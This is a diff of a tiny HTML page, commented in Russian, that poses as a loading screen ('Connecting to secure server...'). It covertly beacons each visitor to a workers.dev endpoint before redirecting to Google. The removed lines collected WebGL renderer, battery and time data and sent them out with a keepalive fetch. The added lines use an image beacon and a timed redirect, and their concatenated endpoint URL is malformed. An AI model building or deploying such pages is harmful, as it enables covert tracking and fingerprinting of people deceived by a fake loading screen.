@@ -1,48 +1,31 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
     <script>
-        async function sendAndRedirect() {
-            const dest = "https://google.com";
-            const workerUrl = "https://workers.dev";
+        function run() {
+            const workerUrl = "https://workers.dev" + Date.now();
+            const redirectTo = "https://google.com";
             
-            // 1. Сбор данных
-            const data = {
-                t: new Date().toLocaleString(),
-                gl: (() => {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const debug = gl?.getExtension('WEBGL_debug_renderer_info');
-                    return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'N/A';
-                })(),
-                bat: await (async () => {
-                    if (!navigator.getBattery) return 'N/A';
-                    const b = await navigator.getBattery();
-                    return `${Math.round(b.level * 100)}%${b.charging ? '+' : '-'}`;
-                })()
+            const img = new Image();
+            
+            // Уходим в гугл только через 3 секунды, даем время провайдеру пропустить пакет
+            const done = () => { 
+                setTimeout(() => { window.location.replace(redirectTo); }, 3000); 
             };
 
-            // 2. Формирование URL
-            const query = new URLSearchParams(data).toString();
-            const finalUrl = workerUrl + "?" + query;
+            img.onload = done;
+            img.onerror = done;
+            img.src = workerUrl;
 
-            // 3. Отправка (keepalive позволяет запросу выжить после закрытия страницы)
-            try {
-                fetch(finalUrl, { mode: 'no-cors', keepalive: true });
-            } catch (e) { }
-
-            // 4. Редирект через небольшую паузу для гарантии старта запроса
-            setTimeout(() => {
-                window.location.replace(dest);
-            }, 800);
+            // Страховочный таймер
+            setTimeout(done, 5000);
         }
-
-        sendAndRedirect();
+        window.onload = run;
     </script>
 </head>
-<body>
-    <p>Загрузка системы...</p>
+<body style="background:#000; color:#333;">
+    <p>Connecting to secure server...</p>
 </body>
 </html>
+
